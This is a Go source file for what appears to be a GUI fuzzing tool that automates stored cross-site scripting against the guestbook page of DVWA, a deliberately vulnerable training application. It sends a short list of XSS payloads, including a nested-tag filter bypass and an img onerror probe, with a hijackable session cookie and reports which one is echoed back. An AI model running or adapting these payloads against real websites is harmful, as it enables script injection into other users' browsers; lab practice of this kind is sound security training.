//XSS Store
package main

import (
	"fmt"
    "strings"
    "io/ioutil"
	"net/http"
)

func XSSWithCookie(cookstr string,fuckurl string,payload string) bool{
	client := &http.Client{};
	cookie2 := &http.Cookie{Name:"PHPSESSID",Value:cookstr,HttpOnly:true};
	cookie3 := &http.Cookie{Name:"security",Value:"high",HttpOnly:true};
	Modipayload := strings.NewReader("txtName="+payload+"&mtxMessage=ghgh&btnSign=Sign+Guestbook")

	reqest2, err := http.NewRequest("POST", fuckurl,Modipayload)
	if err != nil{
		return false
	}
	reqest2.AddCookie(cookie2)
	reqest2.AddCookie(cookie3)
	reqest2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp2,err := client.Do(reqest2);
	body, err := ioutil.ReadAll(resp2.Body)
    if err != nil {
        return false
    }
	bd := string(body)

	if strings.LastIndex(bd, payload) != -1{
		return true
	}
	return false
}

//进行爆破
func ExcXssStore(cookie string,urlDVWA string,sw *BruteSubWindow) bool {
	sw.pushAble = false
	
	fuckurl := urlDVWA + "vulnerabilities/xss_s/"

	var payloadJar = []string{"<script>alert('xss')</script>","<script>alert(/xss/)</script>","<sc<script>ript>alert(/xss/)</script>","<img src=1 onerror=alert(/xss/)>"}

	sw.progressBar.SetRange(0,len(payloadJar))
	sw.progressBar.SetValue(0)

   	for count:=0;count<len(payloadJar);count++ {
		payload := payloadJar[count]
		temp := fmt.Sprintf("fuzz test payload%d : %s \r\n\r\n",count+1,payload)
		sw.progressBar.SetValue(count+1)
		sw.outPut.AppendText(temp)
		if XSSWithCookie(cookie,fuckurl,payload) == true{
			sw.outPut.AppendText("\nsuccess!\r\n")
			sw.progressBar.SetValue(len(payloadJar))
			sw.pushAble = true
			return true
		}
		if count%5 == 0 && count !=0{
			sw.outPut.SetText("")
		}
	   }
	   temp := fmt.Sprintf("No Pattern...")
	   sw.outPut.AppendText(temp)
	   sw.pushAble = true
	   return false

}